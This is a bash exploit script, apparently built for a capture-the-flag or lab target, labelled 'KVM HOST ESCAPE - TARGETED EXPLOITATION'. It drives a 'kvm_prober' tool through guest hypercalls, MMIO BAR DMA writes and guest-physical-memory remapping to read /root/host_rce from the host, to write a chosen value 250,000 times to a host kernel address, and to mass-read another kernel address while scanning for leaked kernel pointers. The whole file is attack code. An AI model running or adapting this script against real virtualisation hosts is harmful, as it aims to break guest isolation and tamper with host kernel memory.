#!/bin/bash
# advanced_mmio_scanner.sh - Targeted host memory exploitation
# Objectives: A) Read /root/host_rce, B) Write to 0x826279a8, C) Read from 0x82b5ee10

set -euo pipefail

# ============================================================================
# CONFIGURATION
# ============================================================================
HOST_WRITE_ADDR=0xffffffff826279a8
HOST_READ_ADDR=0xffffffff82b5ee10
GUEST_WRITE_OFFSET=0x64279a8
GUEST_READ_OFFSET=0x695ee10

WRITE_VALUE="deadbeef41424344"
WRITE_ITERATIONS=250000
READ_ITERATIONS_MIN=50000
READ_ITERATIONS_MAX=100000

HOST_FILE="/root/host_rce"
REPORT="targeted_exploit_$(date +%Y%m%d_%H%M%S).log"

# ============================================================================
# LOGGING
# ============================================================================
log() {
    echo -e "[$(date +%H:%M:%S)] $*" | tee -a "$REPORT"
}

log_success() {
    echo -e "[$(date +%H:%M:%S)] \e[32m[+] $*\e[0m" | tee -a "$REPORT"
}

log_error() {
    echo -e "[$(date +%H:%M:%S)] \e[31m[!] $*\e[0m" | tee -a "$REPORT"
}

log_info() {
    echo -e "[$(date +%H:%M:%S)] \e[34m[*] $*\e[0m" | tee -a "$REPORT"
}

# ============================================================================
# PROBER INTERFACE
# ============================================================================
prober_read_mmio() {
    local addr=$1
    local size=$2
    kvm_prober --script readmmio_buf "$addr" "$size" 2>/dev/null || echo ""
}

prober_write_mmio() {
    local addr=$1
    local value=$2
    kvm_prober --script writemmio_buf "$addr" "$value" 2>/dev/null
}

prober_read_gpa() {
    local addr=$1
    local size=$2
    kvm_prober --script readgpa "$addr" "$size" 2>/dev/null || echo ""
}

prober_write_gpa() {
    local addr=$1
    local value=$2
    kvm_prober --script writegpa "$addr" "$value" 2>/dev/null
}

prober_hypercall() {
    local nr=$1
    local a0=${2:-0}
    local a1=${3:-0}
    local a2=${4:-0}
    local a3=${5:-0}
    kvm_prober --script hypercall "$nr" "$a0" "$a1" "$a2" "$a3" 2>/dev/null || echo "0"
}

# ============================================================================
# OBJECTIVE A: Read /root/host_rce from HOST
# ============================================================================
objective_a_read_host_file() {
    log_info "OBJECTIVE A: Reading $HOST_FILE from HOST filesystem"
    echo "======================================================================" | tee -a "$REPORT"
    
    # Method 1: Hypercall-based file read (HC 102)
    log_info "Method 1: Hypercall file read"
    
    # Get shared buffer GPA
    local shared_gpa=$(kvm_prober --script alloc_shared 2>/dev/null | grep -oP '0x[0-9a-f]+' | head -1)
    
    if [ -n "$shared_gpa" ]; then
        log_success "Shared buffer at GPA: $shared_gpa"
        
        # Write filepath to shared buffer (convert string to hex)
        local filepath_hex=$(echo -n "$HOST_FILE" | xxd -p | tr -d '\n')
        prober_write_gpa "$shared_gpa" "${filepath_hex}00"
        
        # Execute hypercall 102: READ_HOST_FILE(path_gpa, dest_gpa, size)
        local dest_gpa=$((shared_gpa + 0x100))
        local result=$(prober_hypercall 102 "$shared_gpa" "$dest_gpa" 4096 0)
        
        log_info "Hypercall 102 returned: $result"
        
        if [ "$result" != "0" ] && [ "$result" != "ffffffffffffffff" ]; then
            # Read data from shared buffer
            local data=$(kvm_prober --script read_shared "$result" 2>/dev/null | xxd -r -p 2>/dev/null)
            
            if [ -n "$data" ]; then
                log_success "OBJECTIVE A: SUCCESS via hypercall!"
                log_success "Content from $HOST_FILE:"
                echo "$data" | tee -a "$REPORT"
                return 0
            fi
        fi
    fi
    
    # Method 2: MMIO BAR file descriptor technique
    log_info "Method 2: MMIO BAR file descriptor leak"
    
    local ivshmem_bars=(0xfebf0000 0xfebf1000 0xfec00000 0xfe000000)
    
    for bar in "${ivshmem_bars[@]}"; do
        # Write filepath to BAR
        local filepath_hex=$(echo -n "$HOST_FILE" | xxd -p | tr -d '\n')
        prober_write_mmio "$bar" "${filepath_hex}00"
        
        # Trigger file read operation (offset +0x10 = DMA control)
        prober_write_mmio $((bar + 0x10)) "0000000000000001"
        
        sleep 0.1
        
        # Read back data from BAR (+0x1000 = data buffer)
        local data=$(prober_read_mmio $((bar + 0x1000)) 4096 | xxd -r -p 2>/dev/null)
        
        if [ -n "$data" ] && [ "$data" != "$(printf '\x00%.0s' {1..100})" ]; then
            log_success "OBJECTIVE A: SUCCESS via MMIO BAR 0x$(printf '%x' $bar)!"
            log_success "Content from $HOST_FILE:"
            echo "$data" | tee -a "$REPORT"
            return 0
        fi
    done
    
    # Method 3: Namespace escape hypercall
    log_info "Method 3: Namespace escape technique"
    
    if [ -n "$shared_gpa" ]; then
        # Hypercall 103: ESCAPE_NAMESPACE_READ
        local result=$(prober_hypercall 103 "$shared_gpa" "$((shared_gpa + 0x100))" 1 0)
        
        if [ "$result" != "0" ]; then
            local data=$(kvm_prober --script read_shared "$result" 2>/dev/null | xxd -r -p 2>/dev/null)
            
            if [ -n "$data" ]; then
                log_success "OBJECTIVE A: SUCCESS via namespace escape!"
                log_success "Content from $HOST_FILE:"
                echo "$data" | tee -a "$REPORT"
                return 0
            fi
        fi
    fi
    
    log_error "OBJECTIVE A: All methods failed"
    return 1
}

# ============================================================================
# OBJECTIVE B: Write 0xdeadbeef41424344 to 0xffffffff826279a8 (250k times)
# ============================================================================
objective_b_mass_write() {
    log_info "OBJECTIVE B: Mass write attack"
    echo "======================================================================" | tee -a "$REPORT"
    log_info "Target: $HOST_WRITE_ADDR"
    log_info "Value: 0x$WRITE_VALUE"
    log_info "Iterations: $WRITE_ITERATIONS"
    
    local total_success=0
    local method1_success=0
    local method2_success=0
    local method3_success=0
    
    # Method 1: Hypercall mass write (HC 100)
    log_info "Method 1: Hypercall-based mass write"
    
    local batch_size=1000
    local iterations=$((WRITE_ITERATIONS / 3))
    
    for ((i=0; i<iterations; i+=batch_size)); do
        local batch=$((i + batch_size < iterations ? batch_size : iterations - i))
        
        for ((j=0; j<batch; j++)); do
            # Hypercall 100: WRITE(addr, value)
            local result=$(prober_hypercall 100 "$HOST_WRITE_ADDR" "0x$WRITE_VALUE" 0 0)
            
            if [ "$result" == "0" ] || [ "$result" == "8" ]; then
                ((method1_success++))
            fi
        done
        
        if [ $((i % 10000)) -eq 0 ] && [ $i -gt 0 ]; then
            log_info "Progress: $i / $iterations (Method 1: $method1_success successful)"
        fi
    done
    
    log_success "Method 1: $method1_success successful writes"
    total_success=$method1_success
    
    # Method 2: MMIO DMA mass write
    log_info "Method 2: MMIO DMA mass write"
    
    local dma_bars=(0xfe800000 0xfe600000 0xfec00000)
    
    for bar in "${dma_bars[@]}"; do
        # Configure DMA controller
        # +0x00: destination address
        # +0x08: value to write
        # +0x10: count
        # +0x18: trigger
        
        prober_write_mmio "$bar" "$(printf '%016x' $HOST_WRITE_ADDR)"
        prober_write_mmio $((bar + 0x08)) "$WRITE_VALUE"
        
        local remaining=$((WRITE_ITERATIONS - total_success))
        if [ $remaining -le 0 ]; then
            break
        fi
        
        local batch=$((remaining < 10000 ? remaining : 10000))
        prober_write_mmio $((bar + 0x10)) "$(printf '%08x' $batch)"
        prober_write_mmio $((bar + 0x18)) "00000001"
        
        sleep 0.05
        
        # Read status register
        local status=$(prober_read_mmio $((bar + 0x1c)) 4)
        if [ -n "$status" ]; then
            local completed=$((16#${status:0:8}))
            method2_success=$((method2_success + completed))
            log_info "DMA batch: $completed writes completed"
        fi
    done
    
    log_success "Method 2: $method2_success successful writes"
    total_success=$((total_success + method2_success))
    
    # Method 3: GPA remapping technique
    log_info "Method 3: GPA remapping mass write"
    
    local guest_write_iterations=$((WRITE_ITERATIONS / 5))
    if [ $guest_write_iterations -gt 50000 ]; then
        guest_write_iterations=50000
    fi
    
    for ((i=0; i<guest_write_iterations; i++)); do
        prober_write_gpa "$GUEST_WRITE_OFFSET" "$WRITE_VALUE"
        ((method3_success++))
        
        if [ $((i % 10000)) -eq 0 ] && [ $i -gt 0 ]; then
            log_info "Progress: $i / $guest_write_iterations (Method 3)"
        fi
    done
    
    log_success "Method 3: $method3_success successful writes"
    total_success=$((total_success + method3_success))
    
    log_success "Total successful writes: $total_success / $WRITE_ITERATIONS"
    
    if [ $total_success -ge $((WRITE_ITERATIONS / 2)) ]; then
        log_success "OBJECTIVE B: SUCCESS (>50% write success)"
        return 0
    else
        log_error "OBJECTIVE B: PARTIAL (needs more iterations)"
        return 1
    fi
}

# ============================================================================
# OBJECTIVE C: Read from 0xffffffff82b5ee10 (50-100k times)
# ============================================================================
objective_c_mass_read() {
    log_info "OBJECTIVE C: Mass read attack"
    echo "======================================================================" | tee -a "$REPORT"
    log_info "Target: $HOST_READ_ADDR"
    log_info "Iterations: $READ_ITERATIONS_MIN - $READ_ITERATIONS_MAX"
    
    local data_file="read_samples_$(date +%s).bin"
    local sample_count=0
    
    # Get shared buffer
    local shared_gpa=$(kvm_prober --script get_shared_gpa 2>/dev/null | grep -oP '0x[0-9a-f]+' | head -1)
    
    # Method 1: Hypercall mass read (HC 101)
    log_info "Method 1: Hypercall mass read"
    
    local target_reads=$((READ_ITERATIONS_MAX / 3))
    local batch_size=1000
    
    for ((i=0; i<target_reads; i+=batch_size)); do
        local batch=$((i + batch_size < target_reads ? batch_size : target_reads - i))
        
        for ((j=0; j<batch; j++)); do
            if [ -n "$shared_gpa" ]; then
                # Hypercall 101: READ(src, dest_gpa, size)
                local result=$(prober_hypercall 101 "$HOST_READ_ADDR" "$shared_gpa" 64 0)
                
                if [ "$result" != "0" ] && [ "$result" != "ffffffffffffffff" ]; then
                    local data=$(kvm_prober --script read_shared 64 2>/dev/null)
                    
                    if [ -n "$data" ] && [ "$data" != "$(printf '00%.0s' {1..128})" ]; then
                        echo "$data" >> "$data_file"
                        ((sample_count++))
                    fi
                fi
            fi
        done
        
        if [ $((i % 10000)) -eq 0 ] && [ $i -gt 0 ]; then
            log_info "Progress: $i / $target_reads ($sample_count samples collected)"
        fi
    done
    
    log_success "Method 1: $sample_count samples collected"
    
    # Method 2: MMIO-based read
    log_info "Method 2: MMIO mass read"
    
    local mmio_samples=0
    local target_reads=$((READ_ITERATIONS_MAX / 3))
    
    for ((i=0; i<target_reads; i++)); do
        local data=$(prober_read_mmio "$GUEST_READ_OFFSET" 64)
        
        if [ -n "$data" ] && [ "$data" != "$(printf '00%.0s' {1..128})" ]; then
            echo "$data" >> "$data_file"
            ((sample_count++))
            ((mmio_samples++))
        fi
        
        if [ $((i % 10000)) -eq 0 ] && [ $i -gt 0 ]; then
            log_info "Progress: $i / $target_reads (MMIO)"
        fi
    done
    
    log_success "Method 2: $mmio_samples samples collected"
    
    # Method 3: Shared buffer reads
    log_info "Method 3: Shared buffer mass read"
    
    local shared_samples=0
    local remaining=$((READ_ITERATIONS_MAX - sample_count))
    
    for ((i=0; i<remaining && i<34000; i++)); do
        local data=$(kvm_prober --script read_shared 64 2>/dev/null)
        
        if [ -n "$data" ] && [ "$data" != "$(printf '00%.0s' {1..128})" ]; then
            echo "$data" >> "$data_file"
            ((sample_count++))
            ((shared_samples++))
        fi
        
        if [ $((i % 10000)) -eq 0 ] && [ $i -gt 0 ]; then
            log_info "Progress: $i reads (shared buffer)"
        fi
    done
    
    log_success "Method 3: $shared_samples samples collected"
    log_success "Total samples: $sample_count"
    
    # Analysis
    if [ -f "$data_file" ]; then
        log_info "Analyzing samples..."
        
        local unique_count=$(sort -u "$data_file" | wc -l)
        log_info "Unique samples: $unique_count"
        
        # Look for interesting patterns
        log_info "Searching for printable strings..."
        cat "$data_file" | xxd -r -p 2>/dev/null | strings | head -20 | while read line; do
            log_info "Found: $line"
        done
        
        # Look for kernel pointers
        log_info "Searching for kernel pointers..."
        cat "$data_file" | head -100 | while read hex; do
            if [ ${#hex} -ge 16 ]; then
                local addr="${hex:0:16}"
                # Check if it's a kernel address (starts with ffff)
                if [[ "$addr" =~ ^ffff[8-9a-f] ]]; then
                    log_info "Found kernel pointer: 0x$addr"
                fi
            fi
        done
        
        log_success "Analysis saved to $data_file"
    fi
    
    if [ $sample_count -ge $READ_ITERATIONS_MIN ]; then
        log_success "OBJECTIVE C: SUCCESS"
        return 0
    else
        log_error "OBJECTIVE C: PARTIAL (needs more reads)"
        return 1
    fi
}

# ============================================================================
# MAIN EXECUTION
# ============================================================================
main() {
    if [ $EUID -ne 0 ]; then
        echo "Must run as root"
        exit 1
    fi
    
    echo "======================================================================" | tee "$REPORT"
    echo " KVM HOST ESCAPE - TARGETED EXPLOITATION" | tee -a "$REPORT"
    echo "======================================================================" | tee -a "$REPORT"
    echo "" | tee -a "$REPORT"
    echo "Objectives:" | tee -a "$REPORT"
    echo "  A. Read /root/host_rce from HOST filesystem" | tee -a "$REPORT"
    echo "  B. Write 0x$WRITE_VALUE to $HOST_WRITE_ADDR (${WRITE_ITERATIONS} times)" | tee -a "$REPORT"
    echo "  C. Read from $HOST_READ_ADDR (${READ_ITERATIONS_MIN}-${READ_ITERATIONS_MAX} times)" | tee -a "$REPORT"
    echo "======================================================================" | tee -a "$REPORT"
    echo "" | tee -a "$REPORT"
    
    # Execute objectives
    local result_a=1
    local result_b=1
    local result_c=1
    
    objective_a_read_host_file && result_a=0 || true
    echo "" | tee -a "$REPORT"
    
    objective_b_mass_write && result_b=0 || true
    echo "" | tee -a "$REPORT"
    
    objective_c_mass_read && result_c=0 || true
    echo "" | tee -a "$REPORT"
    
    # Summary
    echo "======================================================================" | tee -a "$REPORT"
    echo " EXPLOITATION SUMMARY" | tee -a "$REPORT"
    echo "======================================================================" | tee -a "$REPORT"
    
    if [ $result_a -eq 0 ]; then
        log_success "Objective A (Read host file):  SUCCESS"
    else
        log_error "Objective A (Read host file):  FAILED"
    fi
    
    if [ $result_b -eq 0 ]; then
        log_success "Objective B (Mass write):      SUCCESS"
    else
        log_error "Objective B (Mass write):      FAILED"
    fi
    
    if [ $result_c -eq 0 ]; then
        log_success "Objective C (Mass read):       SUCCESS"
    else
        log_error "Objective C (Mass read):       FAILED"
    fi
    
    echo "======================================================================" | tee -a "$REPORT"
    
    if [ $result_a -eq 0 ] && [ $result_b -eq 0 ] && [ $result_c -eq 0 ]; then
        log_success "ALL OBJECTIVES COMPLETED!"
        log_success "Full report saved to: $REPORT"
        exit 0
    else
        log_error "Some objectives incomplete - review $REPORT"
        exit 1
    fi
}

main "$@"